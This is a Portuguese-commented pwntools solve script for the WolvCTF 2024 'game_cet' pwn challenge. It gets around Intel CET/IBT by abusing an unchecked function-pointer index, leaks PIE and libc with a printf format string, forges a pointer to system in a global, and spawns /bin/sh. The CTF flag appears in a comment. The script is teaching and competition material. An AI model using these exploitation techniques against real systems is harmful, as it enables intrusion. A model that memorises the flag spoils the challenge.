#!/usr/bin/env python3
# =============================================================================
#  Game, CET, Match  —  WolvCTF 2024 · categoria Pwn · desafio game_cet
#  Bypass de Intel CET (IBT / Shadow Stack) por uma falha de LOGICA.
#
#  Este script implementa, em codigo, exatamente a cadeia descrita nos slides
#  e no roteiro de apresentacao. Cada etapa esta anotada com o numero do slide
#  correspondente.
#
#  Ideia central (slides 06-16):
#    - Nao da pra pular pro hear_taunt (win) nem chamar execve: o IBT exige
#      ENDBR64 no destino e nos nao controlamos RSI/RDX.
#    - O alvo ideal e system("/bin/sh"): UM argumento (so o RDI, que a gente
#      controla) e comeca com ENDBR64 na libc -> o IBT APROVA.
#    - system nao esta na GOT. Entao: (1) vazamos a libc com printf+format
#      string, (2) forjamos o ponteiro de system dentro do global `banter`
#      byte a byte com taunt/lob, (3) chamamos o indice do banter.
#
#  Uso:
#     python3 solve.py            # local  (contra ./chal)
#     python3 solve.py REMOTE     # remoto (ajuste HOST/PORT abaixo)
#
#  OBS: o binario `chal` original NAO acompanha os slides. Os offsets marcados
#  com [AJUSTAR] precisam ser confirmados contra o binario real (ver README).
#  O script deriva o maximo possivel a partir dos simbolos do ELF; onde o ELF
#  estiver stripado, preencha os valores constantes indicados.
# =============================================================================

from pwn import *

# ---------------------------------------------------------------------------
# Configuracao
# ---------------------------------------------------------------------------
BINARY = "./chal"
HOST, PORT = "wolvctf.io", 1337        # [AJUSTAR] endereco do servico remoto
LIBC_PATH = "./libc.so.6"              # libc do alvo (se voce ja a identificou)

context.binary = BINARY
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False) if os.path.exists(LIBC_PATH) else None


def start():
    if args.REMOTE or "REMOTE" in sys.argv:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="c")
    return process(BINARY)


# ---------------------------------------------------------------------------
#  A primitiva do bug  (slides 04-05)
#
#  main() faz, em pseudocodigo:
#      read(0, buf, 0xff);
#      option = strtol(buf, &rest, 10);   // SEM validar o retorno (com sinal!)
#      arg    = rest + 1;                 // "resto da linha" vira o RDI
#      (*(code *)ptrs[(int)option - 1])(arg);
#
#  Entao mandamos "<option> <arg>" e o programa chama ptrs[option-1] com
#  RDI = arg. Como option e com sinal e sem limite, ptrs[option-1] alcanca
#  QUALQUER ponteiro relativo a base do binario (inclusive a GOT) e tambem o
#  global `banter`, que fica a um offset fixo de ptrs.
# ---------------------------------------------------------------------------

#  Endereco da tabela ptrs[] e do global banter. Se os simbolos existirem no
#  ELF, derivamos automaticamente; senao, preencha os offsets estaticos.
PTRS_ADDR   = elf.symbols.get("ptrs")   or 0x0  # [AJUSTAR] se stripado
BANTER_ADDR = elf.symbols.get("banter") or 0x0  # [AJUSTAR] se stripado


def idx_for(addr):
    """Indice `option` tal que ptrs[option-1] == addr.
       option = (addr - &ptrs)/8 + 1   (pode ser negativo: anda pra tras)."""
    assert (addr - PTRS_ADDR) % 8 == 0, "endereco nao alinhado com a vtable"
    return (addr - PTRS_ADDR) // 8 + 1


def call(io, option, arg=b""):
    """Dispara ptrs[option-1](arg). `arg` vira o RDI."""
    if isinstance(arg, str):
        arg = arg.encode()
    io.sendline(str(option).encode() + b" " + arg)


def call_got(io, func, arg=b""):
    """Chama uma funcao da libc via GOT (entrada comeca com ENDBR64 -> IBT ok)."""
    return call(io, idx_for(elf.got[func]), arg)


# Atalhos para as "funcoes de brinquedo" do menu (indices 1..4 = ptrs[0..3]).
def swing(io, arg=b""):       call(io, 1, arg)   # ptrs[0]: imprime um ponteiro
def lob(io):                  call(io, 2)        # ptrs[1]: banter <<= 8
def taunt(io, byte_val):      call(io, 3, str(byte_val).encode())  # ptrs[2]: banter |= atoi(arg)
# def hear_taunt(io):         call(io, 4)        # ptrs[3]: execve -> BLOQUEADO pelo IBT


# ---------------------------------------------------------------------------
#  Etapa 1 + 2 — Vazamento com printf + format string   (slide 11)
#
#  printf esta na GOT e recebe UM argumento (o formato). Chamamos printf pelo
#  bug com RDI = nosso buffer -> format string controlado.
#    - %p   : despeja valores da pilha/registradores -> acha a base do binario.
#    - %N$s : le o conteudo de um endereco que colocamos no proprio buffer
#             (o buffer esta na pilha, offset FMT_OFFSET) -> le a GOT -> libc.
# ---------------------------------------------------------------------------

FMT_OFFSET = 6   # [AJUSTAR] posicao na pilha onde comeca o nosso buffer.
                 # Descubra mandando "%p|%p|%p|..." e localizando o marcador.


def find_fmt_offset(io):
    """Helper opcional: localiza em que %N$ o nosso buffer aparece."""
    marker = b"ABCD"
    for n in range(1, 40):
        p = start() if io is None else io
        call_got(p, "printf", marker + b"|%" + str(n).encode() + b"$p")
        line = p.recvline()
        if b"0x44434241" in line:  # "ABCD" little-endian
            log.success("FMT_OFFSET = %d", n)
            return n
    return None


def leak_binary_base(io):
    """Vaza a base do binario (PIE) via %p. Slide 11, passo 1 ('meio as cegas')."""
    # Pedimos varios %p e procuramos um ponteiro 0x55.../0x56... (codigo PIE).
    call_got(io, "printf", b"|".join(b"%p" for _ in range(20)))
    leaks = io.recvline().strip().split(b"|")
    for raw in leaks:
        try:
            val = int(raw, 16)
        except ValueError:
            continue
        # Um ponteiro de codigo do binario tem a faixa alta 0x55/0x56.
        if (val >> 40) in (0x55, 0x56):
            # [AJUSTAR] subtraia o offset estatico do simbolo vazado p/ achar a base.
            KNOWN_OFFSET = 0x0  # ex.: offset de um retorno conhecido em .text
            base = val - KNOWN_OFFSET
            base &= ~0xfff      # alinha a pagina
            log.success("base do binario = %#x", base)
            return base
    log.failure("nao achei ponteiro PIE nos %p; ajuste a varredura")
    return None


def leak_libc_addr(io, bin_base, func):
    """Le GOT[func] com %s -> endereco real da funcao na libc. Slide 11, passo 2."""
    got_addr = bin_base + (elf.got[func] - elf.address)
    # Alinha para que o endereco caia num slot de 8 bytes da pilha, e usa %N$s.
    payload = b"%" + str(FMT_OFFSET + 1).encode() + b"$s||"
    payload = payload.ljust(8, b"A")       # alinhamento a 8 bytes
    payload += p64(got_addr)               # endereco lido pelo %s
    call_got(io, "printf", payload)
    data = io.recvuntil(b"||").split(b"||")[0]
    addr = u64(data[:6].ljust(8, b"\x00"))
    log.success("libc %s = %#x", func, addr)
    return addr


# ---------------------------------------------------------------------------
#  Etapa 3 — Forjar system no `banter`, byte a byte   (slides 12-13)
#
#  banter comeca em 0. Para cada byte (do mais ALTO ao mais baixo):
#      taunt(x)  ->  banter |= x      (grava x na posicao mais baixa, zerada)
#      lob()     ->  banter <<= 8     (abre espaco zerado p/ o proximo)
#  Sem deslocar depois do ultimo byte, senao bagunca o alinhamento.
# ---------------------------------------------------------------------------

def write_banter(io, value):
    """Escreve `value` (6 bytes) no global banter usando taunt(OR)+lob(shift)."""
    for i in range(5, -1, -1):               # byte 5 (mais alto) -> byte 0
        x = (value >> (i * 8)) & 0xff
        taunt(io, x)                         # banter |= x
        if i != 0:
            lob(io)                          # banter <<= 8


# ---------------------------------------------------------------------------
#  Cadeia completa   (slide 14)
# ---------------------------------------------------------------------------

def exploit():
    io = start()

    # --- Passo 1: base do binario (resolve PIE) ---
    bin_base = leak_binary_base(io)
    elf.address = bin_base                    # reloca os simbolos do ELF

    # --- Passo 2: ler a GOT -> identificar a libc -> endereco de system ---
    leak_printf = leak_libc_addr(io, bin_base, "printf")

    global libc
    if libc is None:
        # Sem libc local: use os vazamentos (printf/read/puts) no libc.rip /
        # LibcSearcher para identificar a versao e descomente o bloco abaixo.
        #   from LibcSearcher import LibcSearcher
        #   s = LibcSearcher("printf", leak_printf)
        #   libc_base = leak_printf - s.dump("printf")
        #   system_addr = libc_base + s.dump("system")
        log.error("Forneca LIBC_PATH ou use LibcSearcher com o leak de printf "
                  "(%#x) para resolver system." % leak_printf)
        return
    else:
        libc.address = leak_printf - libc.symbols["printf"]
        log.success("libc base = %#x", libc.address)
        system_addr = libc.symbols["system"]
    log.success("system = %#x", system_addr)

    # --- Passo 3: forjar system dentro do banter (taunt + lob) ---
    write_banter(io, system_addr)

    # --- Passo 4: chamar o indice do banter com RDI = "/bin/sh" ---
    #   ptrs[banter_index-1] == banter == &system  ->  system("/bin/sh")
    #   O system comeca com ENDBR64 na libc, entao o IBT APROVA. ("popping a shell")
    banter_index = idx_for(BANTER_ADDR)
    call(io, banter_index, b"/bin/sh\x00")

    log.success("popping a shell")
    io.interactive()                          # wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly}


if __name__ == "__main__":
    exploit()
